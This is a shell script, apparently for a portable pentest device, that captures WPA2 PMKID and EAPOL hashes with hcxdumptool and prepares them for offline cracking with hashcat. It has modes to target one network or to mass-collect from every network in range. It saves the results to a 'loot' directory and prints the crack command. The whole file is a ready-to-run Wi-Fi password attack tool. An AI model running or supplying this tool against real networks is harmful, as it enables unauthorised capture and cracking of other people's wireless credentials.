#!/bin/sh
#===============================================================================
#  NULLSEC PMKID BLITZ - Fast PMKID Capture for WPA2 Networks
#===============================================================================

LOOT_DIR="/mmc/nullsec/handshakes"
LOG_FILE="/root/nullsec/logs/pmkid_$(date +%Y%m%d_%H%M%S).log"
IFACE="${IFACE:-wlan1mon}"

mkdir -p "$LOOT_DIR" "$(dirname $LOG_FILE)"

log() { echo "[$(date '+%H:%M:%S')] $1" | tee -a "$LOG_FILE"; }

# Check for hcxdumptool
check_tools() {
    if ! command -v hcxdumptool >/dev/null 2>&1; then
        log "Installing hcxdumptool..."
        opkg update && opkg install hcxdumptool hcxtools
    fi
}

# Quick PMKID scan
pmkid_scan() {
    local duration="${1:-60}"
    local output="$LOOT_DIR/pmkid_$(date +%Y%m%d_%H%M%S)"
    
    check_tools
    
    log "Starting PMKID capture for ${duration}s..."
    log "Output: ${output}.pcapng"
    
    # Kill interfering processes
    airmon-ng check kill 2>/dev/null
    
    # Run hcxdumptool
    timeout "$duration" hcxdumptool -i "$IFACE" -o "${output}.pcapng" --active_beacon --enable_status=15 2>&1 | tee -a "$LOG_FILE"
    
    # Convert to hashcat format
    if [[ -f "${output}.pcapng" ]]; then
        log "Converting to hashcat format..."
        hcxpcapngtool -o "${output}.22000" "${output}.pcapng" 2>&1 | tee -a "$LOG_FILE"
        
        if [[ -f "${output}.22000" ]]; then
            local count=$(wc -l < "${output}.22000")
            log "Captured $count PMKID/EAPOL hashes!"
            echo ""
            echo "=== CAPTURED HASHES ==="
            cat "${output}.22000"
            echo ""
            echo "Crack with: hashcat -m 22000 ${output}.22000 wordlist.txt"
        fi
    fi
}

# Target specific network
pmkid_target() {
    local bssid="$1"
    local channel="$2"
    local duration="${3:-30}"
    
    [[ -z "$bssid" || -z "$channel" ]] && { echo "Usage: $0 target <BSSID> <CHANNEL> [duration]"; exit 1; }
    
    local output="$LOOT_DIR/pmkid_$(echo $bssid | tr ':' '-')_$(date +%H%M%S)"
    
    check_tools
    
    log "Targeting $bssid on channel $channel..."
    
    # Set channel
    iwconfig "$IFACE" channel "$channel" 2>/dev/null
    
    # Create filter file
    echo "$bssid" | tr ':' ' ' | awk '{printf "%s%s%s%s%s%s", $1, $2, $3, $4, $5, $6}' > /tmp/pmkid_filter.txt
    
    timeout "$duration" hcxdumptool -i "$IFACE" -o "${output}.pcapng" \
        --filterlist_ap=/tmp/pmkid_filter.txt --filtermode=2 \
        --active_beacon --enable_status=15 2>&1 | tee -a "$LOG_FILE"
    
    # Convert
    if [[ -f "${output}.pcapng" ]]; then
        hcxpcapngtool -o "${output}.22000" "${output}.pcapng" 2>&1
        
        if [[ -f "${output}.22000" && -s "${output}.22000" ]]; then
            log "SUCCESS! PMKID captured for $bssid"
            cat "${output}.22000"
        else
            log "No PMKID captured. Target may not be vulnerable."
        fi
    fi
}

# Mass PMKID collection
pmkid_mass() {
    local duration="${1:-300}"
    local output="$LOOT_DIR/pmkid_mass_$(date +%Y%m%d_%H%M%S)"
    
    check_tools
    
    log "Starting mass PMKID collection (${duration}s)..."
    log "Will hop channels and collect from all networks"
    
    # Kill interfering processes
    airmon-ng check kill 2>/dev/null
    
    # Run with channel hopping
    timeout "$duration" hcxdumptool -i "$IFACE" -o "${output}.pcapng" \
        --active_beacon --enable_status=31 \
        --tot=3 --rds=1 2>&1 | tee -a "$LOG_FILE"
    
    # Convert all captures
    if [[ -f "${output}.pcapng" ]]; then
        log "Processing captures..."
        hcxpcapngtool -o "${output}.22000" -E "${output}_essids.txt" -I "${output}_identities.txt" "${output}.pcapng" 2>&1 | tee -a "$LOG_FILE"
        
        if [[ -f "${output}.22000" ]]; then
            local count=$(wc -l < "${output}.22000")
            log "TOTAL: $count PMKID/EAPOL hashes captured!"
            
            echo ""
            echo "=== CAPTURED NETWORKS ==="
            cat "${output}_essids.txt" 2>/dev/null | head -30
            
            echo ""
            echo "Hash file: ${output}.22000"
        fi
    fi
}

# View captured PMKIDs
list_pmkids() {
    echo "=== CAPTURED PMKID FILES ==="
    ls -la "$LOOT_DIR"/*.22000 2>/dev/null
    
    echo ""
    echo "=== TOTAL HASHES ==="
    cat "$LOOT_DIR"/*.22000 2>/dev/null | wc -l | xargs echo "Total hashes:"
    
    echo ""
    echo "=== NETWORKS ==="
    cat "$LOOT_DIR"/*_essids.txt 2>/dev/null | sort -u
}

case "${1:-scan}" in
    scan) shift; pmkid_scan "$@" ;;
    target) shift; pmkid_target "$@" ;;
    mass) shift; pmkid_mass "$@" ;;
    list) list_pmkids ;;
    *)
        echo "NullSec PMKID Blitz"
        echo "Usage: $0 <command> [options]"
        echo ""
        echo "Commands:"
        echo "  scan [seconds]           - Quick PMKID scan (default 60s)"
        echo "  target <BSSID> <CH> [s]  - Target specific network"
        echo "  mass [seconds]           - Mass collection (default 300s)"
        echo "  list                     - View captured PMKIDs"
        echo ""
        echo "Captured hashes are in hashcat 22000 format"
        ;;
esac
